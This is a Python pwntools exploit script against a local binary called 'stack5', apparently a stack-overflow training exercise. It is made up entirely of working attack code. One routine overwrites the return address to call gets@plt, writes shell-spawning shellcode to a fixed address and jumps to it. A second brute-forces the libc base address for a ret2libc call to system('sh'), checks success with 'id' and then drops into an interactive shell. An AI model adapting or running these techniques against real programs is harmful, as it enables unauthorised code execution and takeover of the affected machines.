from pwn import *
import time

def shell():
	r = process("./stack5")
	shellcode = asm(shellcraft.sh())
	get_plt = 0x80482e8
	addrshell = 0x8049000
	payload = "a" *(0x50+8-0x10)
	payload += "a"*4 #ebp
	payload += p32(get_plt) #ret addr 1
	payload += p32(addrshell) #ret addr 2
	payload += p32(addrshell) #arg
	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()
	
	# cmd = 'id'
	# r.sendline(cmd)
	# res = r.recv()
	# if res.find('kiosuper') != -1:
	# 	print 'True'
	# 	r.interactive()
	# r.close()


def brute():
	offset_gets = 0x5F3E0
	offset_system = 0x3ada0
	offset_sh = 0xe5f2+5
	main = 0x080483c4
	# libc = 0xf7000000
	count = 0
	for libc in range(0xf7000000,0xf7fff000,0x1000):
		time.sleep(0.1)
		r = process("./stack5")
		
		system = libc + offset_system
		sh = libc + offset_sh

		count += 1
		log.info("Time %#d: " % count)
		log.info("libc: %#x" % libc)
		log.info("system: %#x" % system)
		log.info("sh: %#x" % sh)
		
		payload = "a" *(0x50+8-0x10+4)
		payload += p32(system)
		payload += p32(main)
		payload += p32(sh)
		r.sendline(payload)
		try:
			cmd = 'id'
			r.sendline(cmd)
			res = r.recv()
			if res.find('kiosuper') != -1:
				r.interactive()
			r.close()
		except EOFError as e:
			log.info("Fail")
			r.close()
			print "\n"
			continue

shell()
# brute()

